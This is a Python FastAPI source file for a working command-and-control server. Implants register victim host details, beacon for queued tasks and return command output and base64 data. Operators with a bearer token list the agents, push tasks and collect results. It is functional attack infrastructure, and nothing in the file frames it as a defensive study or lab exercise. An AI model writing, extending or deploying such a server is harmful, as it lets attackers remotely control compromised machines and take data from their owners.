from fastapi import FastAPI, Request, HTTPException, Header
from pydantic import BaseModel
from typing import Optional, Dict, Any, List
from uuid import uuid4
from datetime import datetime, timezone
import os

app = FastAPI()

AGENT_KEY = os.environ.get("AGENT_KEY", "dev_agent_key")
C2_AUTH = os.environ.get("C2_AUTH", "dev_operator_token")
DEFAULT_SLEEP = float(os.environ.get("DEFAULT_SLEEP", "5"))
DEFAULT_JITTER = float(os.environ.get("DEFAULT_JITTER", "0.3"))

agents: Dict[str, Dict[str, Any]] = {}
queues: Dict[str, List[Dict[str, Any]]] = {}
results: Dict[str, List[Dict[str, Any]]] = {}

class RegisterPayload(BaseModel):
    hostname: str
    platform: str
    username: Optional[str] = None
    pid: Optional[int] = None
    arch: Optional[str] = None
    ip: Optional[str] = None
    agent_version: Optional[str] = None

class BeaconPayload(BaseModel):
    status: Optional[Dict[str, Any]] = None
    capabilities: Optional[List[str]] = None

class TaskCreate(BaseModel):
    agent_id: str
    type: str
    args: Optional[Dict[str, Any]] = None

class ResultPayload(BaseModel):
    task_id: str
    ok: bool
    stdout: Optional[str] = None
    stderr: Optional[str] = None
    exit_code: Optional[int] = None
    data_b64: Optional[str] = None
    note: Optional[str] = None


def _now_iso():
    return datetime.now(timezone.utc).isoformat()

@app.get("/healthz")
async def healthz():
    return {"ok": True, "ts": _now_iso()}

@app.post("/register")
async def register(payload: RegisterPayload, request: Request, x_agent_key: Optional[str] = Header(None)):
    if x_agent_key != AGENT_KEY:
        raise HTTPException(status_code=401, detail="bad agent key")
    agent_id = uuid4().hex[:16]
    agents[agent_id] = {
        "id": agent_id,
        "info": payload.model_dump(),
        "first_seen": _now_iso(),
        "last_seen": _now_iso(),
        "addr": request.client.host if request.client else None,
        "sleep": DEFAULT_SLEEP,
        "jitter": DEFAULT_JITTER,
        "tags": [],
    }
    queues[agent_id] = []
    results[agent_id] = []
    return {"agent_id": agent_id, "sleep": DEFAULT_SLEEP, "jitter": DEFAULT_JITTER}

@app.post("/beacon")
async def beacon(payload: BeaconPayload, request: Request, x_agent_key: Optional[str] = Header(None), x_agent_id: Optional[str] = Header(None)):
    if x_agent_key != AGENT_KEY:
        raise HTTPException(status_code=401, detail="bad agent key")
    if not x_agent_id or x_agent_id not in agents:
        raise HTTPException(status_code=404, detail="unknown agent")
    info = agents[x_agent_id]
    info["last_seen"] = _now_iso()
    info["status"] = payload.status
    info["capabilities"] = payload.capabilities
    task_list = queues.get(x_agent_id, [])
    queues[x_agent_id] = []
    return {"tasks": task_list}

@app.post("/result")
async def submit_result(payload: ResultPayload, request: Request, x_agent_key: Optional[str] = Header(None), x_agent_id: Optional[str] = Header(None)):
    if x_agent_key != AGENT_KEY:
        raise HTTPException(status_code=401, detail="bad agent key")
    if not x_agent_id or x_agent_id not in agents:
        raise HTTPException(status_code=404, detail="unknown agent")
    rec = payload.model_dump()
    rec["ts"] = _now_iso()
    results.setdefault(x_agent_id, []).append(rec)
    if len(results[x_agent_id]) > 200:
        results[x_agent_id] = results[x_agent_id][-200:]
    return {"ok": True}

@app.get("/agents")
async def list_agents(authorization: Optional[str] = Header(None)):
    if authorization != f"Bearer {C2_AUTH}":
        raise HTTPException(status_code=401, detail="bad token")
    return {"agents": list(agents.values())}

@app.get("/results")
async def get_results(agent_id: Optional[str] = None, authorization: Optional[str] = Header(None)):
    if authorization != f"Bearer {C2_AUTH}":
        raise HTTPException(status_code=401, detail="bad token")
    if agent_id:
        return {"results": results.get(agent_id, [])}
    return {"results": results}

@app.post("/task")
async def push_task(payload: TaskCreate, authorization: Optional[str] = Header(None)):
    if authorization != f"Bearer {C2_AUTH}":
        raise HTTPException(status_code=401, detail="bad token")
    if payload.agent_id not in agents:
        raise HTTPException(status_code=404, detail="unknown agent")
    task_id = uuid4().hex
    task = {"task_id": task_id, "type": payload.type, "args": payload.args or {}}
    queues[payload.agent_id].append(task)
    return {"task_id": task_id}
